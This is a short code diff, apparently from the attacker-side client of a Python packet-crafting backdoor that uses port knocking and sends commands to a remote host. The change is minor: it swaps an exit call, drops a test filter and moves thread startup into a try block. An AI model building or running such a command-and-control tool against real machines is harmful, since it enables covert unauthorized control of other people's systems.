@@ -42,7 +42,7 @@ def sendCommand():
         send(packet, verbose=False)
         if cmd == 'close':
             print("Attacker closed...\n")
-            sys.exit(0)
+            os._exit(0)
 
 def parsePacket(packet):
     """
@@ -78,22 +78,20 @@ def listen(mFilter):
 def main():
     mFilter = protocol + " src port " + str(remotePort) + " and dst port " + \
             str(localPort) + " and src host " + remoteIP
-    testFilter = "tcp src port 8505"
     checkRootPrivilege()
     portKnocking()
-
-    send_command_thread = threading.Thread(target=sendCommand)
-    send_command_thread.setDaemon(True)
-    send_command_thread.start()
-
-    listen_thread = threading.Thread(target=listen, args =(mFilter,))
-    listen_thread.setDaemon(True)
-    listen_thread.start()
-
-    send_command_thread.join()
-    listen_thread.join()
-
     try:
+        send_command_thread = threading.Thread(target=sendCommand)
+        send_command_thread.setDaemon(True)
+        send_command_thread.start()
+
+        listen_thread = threading.Thread(target=listen, args =(mFilter,))
+        listen_thread.setDaemon(True)
+        listen_thread.start()
+
+        send_command_thread.join()
+        listen_thread.join()
+
         while threading.active_count() > 0:
             time.sleep(0.1)
     except KeyboardInterrupt:
